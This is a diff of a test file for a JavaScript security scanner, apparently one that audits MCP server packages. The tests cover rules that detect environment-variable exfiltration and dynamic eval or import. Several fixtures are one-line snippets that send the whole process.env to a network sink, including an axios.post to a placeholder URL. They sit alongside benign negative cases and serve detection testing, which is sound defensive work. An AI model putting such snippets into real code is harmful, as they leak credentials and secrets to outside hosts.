@@ -104,19 +104,44 @@ describe('MCP-S003 command injection', () => {
   });
 });
 
-describe('MCP-S004 env exfiltration', () => {
-  it('flags JSON.stringify(process.env)', async () => {
-    const ctx = sourceContext({}, source({ 'x.js': 'const p = JSON.stringify(process.env);' }));
+describe('MCP-S004 env exfiltration (data-flow)', () => {
+  it('flags the whole env serialized directly into a fetch body', async () => {
+    const ctx = sourceContext({}, source({ 'x.js': 'fetch(url, { body: JSON.stringify(process.env) });' }));
     expect(await envExfiltrationRule.check(ctx)).toHaveLength(1);
   });
 
-  it('flags a spread of the whole environment', async () => {
-    const ctx = sourceContext({}, source({ 'x.js': 'const all = {...process.env};' }));
+  it('flags env captured into a variable that later reaches a network sink', async () => {
+    const ctx = sourceContext({}, source({ 'x.js': 'const e = process.env; axios.post("https://x/y", e);' }));
     expect(await envExfiltrationRule.check(ctx)).toHaveLength(1);
   });
 
-  it('does not flag reading a specific env var', async () => {
-    const ctx = sourceContext({}, source({ 'x.js': 'const k = process.env.API_KEY;' }));
+  it('flags a spread of the whole env into a request body', async () => {
+    const ctx = sourceContext({}, source({ 'x.js': 'client.send({ ...process.env });' }));
+    expect(await envExfiltrationRule.check(ctx)).toHaveLength(1);
+  });
+
+  it('does NOT flag env passed to a subprocess (not a network sink)', async () => {
+    const ctx = sourceContext({}, source({ 'x.js': 'spawn("node", ["s.js"], { env: process.env });' }));
+    expect(await envExfiltrationRule.check(ctx)).toEqual([]);
+  });
+
+  it('does NOT flag env passed to a dotenv-style loader', async () => {
+    const ctx = sourceContext({}, source({ 'x.js': 'const cfg = parseEnv(process.env);' }));
+    expect(await envExfiltrationRule.check(ctx)).toEqual([]);
+  });
+
+  it('does NOT flag whole-env capture with no outbound sink', async () => {
+    const ctx = sourceContext({}, source({ 'x.js': 'const all = { ...process.env };' }));
+    expect(await envExfiltrationRule.check(ctx)).toEqual([]);
+  });
+
+  it('does NOT flag an Express route handler (app.post) that reads env in its body', async () => {
+    const ctx = sourceContext({}, source({ 'x.js': "app.post('/', (req, res) => { log(process.env); res.end(); });" }));
+    expect(await envExfiltrationRule.check(ctx)).toEqual([]);
+  });
+
+  it('does not flag reading a specific env var into a fetch', async () => {
+    const ctx = sourceContext({}, source({ 'x.js': 'fetch(url, { headers: { k: process.env.API_KEY } });' }));
     expect(await envExfiltrationRule.check(ctx)).toEqual([]);
   });
 });
@@ -158,7 +183,7 @@ describe('MCP-S006 dynamic eval', () => {
     expect(await dynamicEvalRule.check(ctx)).toHaveLength(1);
   });
 
-  it('flags require() with a computed argument', async () => {
+  it('flags require() with a data-derived argument', async () => {
     const ctx = sourceContext({}, source({ 'x.js': 'const m = require("plugins/" + name);' }));
     expect(await dynamicEvalRule.check(ctx)).toHaveLength(1);
   });
@@ -166,6 +191,16 @@ describe('MCP-S006 dynamic eval', () => {
   it('does not flag a static require', async () => {
     const ctx = sourceContext({}, source({ 'x.js': 'const fs = require("fs");' }));
     expect(await dynamicEvalRule.check(ctx)).toEqual([]);
+  });
+
+  it('does not flag an internal relative import(join(__dirname, "…")) bin-wrapper', async () => {
+    const ctx = sourceContext({}, source({ 'x.js': 'const dir = fileURLToPath(import.meta.url); import(join(dir, "../dist/server.js"));' }));
+    expect(await dynamicEvalRule.check(ctx)).toEqual([]);
+  });
+
+  it('still flags a genuinely data-derived import path', async () => {
+    const ctx = sourceContext({}, source({ 'x.js': 'import(userProvidedModulePath);' }));
+    expect(await dynamicEvalRule.check(ctx)).toHaveLength(1);
   });
 
   it('does not flag namesake METHOD calls like sap.ui.require or fn.eval', async () => {
